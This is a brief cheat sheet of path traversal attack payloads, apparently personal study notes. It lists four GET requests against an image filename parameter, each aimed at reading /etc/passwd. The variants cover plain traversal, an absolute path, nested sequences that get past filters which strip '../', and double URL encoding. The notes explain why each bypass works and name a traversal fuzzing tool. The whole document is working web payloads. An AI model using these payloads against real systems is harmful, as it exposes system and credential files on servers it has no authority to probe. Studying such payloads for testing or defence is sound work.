`GET /image?filename=../../../etc/passwd HTTP/1.1`
`GET /image?filename=/etc/passwd HTTP/1.1`
`GET /image?filename=....//....//....//etc/passwd HTTP/1.1` - when sequences are striped
`GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1` - %25 stands for % in url encoding, so when app is decoding url it will get %2f that stands for /

tool for fuzzing path traversal - dotdotpwn
